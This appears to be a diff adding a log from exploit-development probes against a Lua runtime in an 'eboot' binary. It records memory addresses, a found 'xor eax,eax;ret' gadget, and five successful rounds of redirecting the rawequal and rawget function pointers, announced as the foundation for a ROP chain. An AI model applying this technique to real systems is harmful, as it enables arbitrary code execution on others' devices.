@@ -1,0 +1,72 @@
+=== PROBE 117a: CLEAN GADGET REDIRECT ===
+Section: A
+
+[*] eboot base: 0x00000000_43A7C000
+[*] rawequal:   0x00000003_1041F820
+[*] rawget:     0x00000003_1041F8A0
+[*] rawequal +0x20 original: 0x00000000_43C22770
+[*] rawget   +0x20 original: 0x00000000_43C227C0
+
+[*] Scanning eboot for gadgets...
+  xor eax,eax;ret at eboot+0x471
+
+--- SECTION A: xor eax,eax;ret redirect (5 rounds) ---
+
+[A] gadget addr: 0x00000000_43A7C471
+[A] gadget bytes: 0x8BC3C031 (low 3 should be C3 C0 31)
+[A] baseline rawequal(1,1) = true
+[A] baseline rawequal(1,2) = false
+
+[A-round1] MARKER_BEFORE_WRITE
+[A-round1] MARKER_AFTER_WRITE
+[A-round1] MARKER_AFTER_CALL
+[A-round1] pcall: ok=true r1=nil r2=nil
+[A-round1] *** GADGET EXECUTED: eax=0 confirmed ***
+[A-round1] MARKER_RESTORED
+[A-round1] post-restore rawequal(1,1) = true
+
+[A-round2] MARKER_BEFORE_WRITE
+[A-round2] MARKER_AFTER_WRITE
+[A-round2] MARKER_AFTER_CALL
+[A-round2] pcall: ok=true r1=nil r2=nil
+[A-round2] *** GADGET EXECUTED: eax=0 confirmed ***
+[A-round2] MARKER_RESTORED
+[A-round2] post-restore rawequal(1,1) = true
+
+[A-round3] MARKER_BEFORE_WRITE
+[A-round3] MARKER_AFTER_WRITE
+[A-round3] MARKER_AFTER_CALL
+[A-round3] pcall: ok=true r1=nil r2=nil
+[A-round3] *** GADGET EXECUTED: eax=0 confirmed ***
+[A-round3] MARKER_RESTORED
+[A-round3] post-restore rawequal(1,1) = true
+
+[A-round4] MARKER_BEFORE_WRITE
+[A-round4] MARKER_AFTER_WRITE
+[A-round4] MARKER_AFTER_CALL
+[A-round4] pcall: ok=true r1=nil r2=nil
+[A-round4] *** GADGET EXECUTED: eax=0 confirmed ***
+[A-round4] MARKER_RESTORED
+[A-round4] post-restore rawequal(1,1) = true
+
+[A-round5] MARKER_BEFORE_WRITE
+[A-round5] MARKER_AFTER_WRITE
+[A-round5] MARKER_AFTER_CALL
+[A-round5] pcall: ok=true r1=nil r2=nil
+[A-round5] *** GADGET EXECUTED: eax=0 confirmed ***
+[A-round5] MARKER_RESTORED
+[A-round5] post-restore rawequal(1,1) = true
+
+[A] RESULT: 5/5 gadget exec, 0/5 failures
+[A] *** ARBITRARY GADGET EXECUTION CONFIRMED ***
+[A] *** This is the foundation for a ROP chain ***
+
+[A2] Cross-validation on rawget:
+[A2] baseline rawget({[1]='hello'}, 1) = hello
+[A2] MARKER_RAWGET_BEFORE
+[A2] MARKER_RAWGET_AFTER
+[A2] pcall: ok=true r1=nil
+[A2] *** RAWGET GADGET ALSO WORKS ***
+[A2] restored, rawget({[1]='hello'}, 1) = hello
+
+=== PROBE 117a COMPLETE ===
